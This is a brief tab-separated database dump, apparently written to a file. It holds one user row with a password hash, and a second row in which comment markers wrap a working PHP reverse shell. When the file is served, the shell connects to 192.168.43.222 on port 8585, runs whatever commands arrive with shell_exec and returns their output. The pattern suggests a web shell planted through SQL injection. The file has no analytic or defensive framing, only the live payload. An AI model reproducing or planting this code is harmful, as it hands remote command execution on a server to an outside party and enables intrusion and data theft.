66	mahyar	c4ca4238a0b923820dcc509a6f75849b	mahyar	this is mahyar
/*	\N	\N	*/	\
\
<?php\
$ip = '192.168.43.222'; // Change this to your local machine's IP address\
$port = 8585; // Change this to the same port you are using in the listener\
\
$sock = fsockopen($ip, $port);\
if ($sock) {\
    // Redirect standard input, output, and error to the socket\
    set_time_limit(0);\
    while (true) {\
        // Read command from the socket\
        $cmd = fgets($sock);\
        if ($cmd === "exit\
") break; // Exit command to close the shell\
        // Execute the command and return the output\
        $output = shell_exec($cmd);\
        fwrite($sock, $output);\
    }\
    fclose($sock);\
}\
?>\

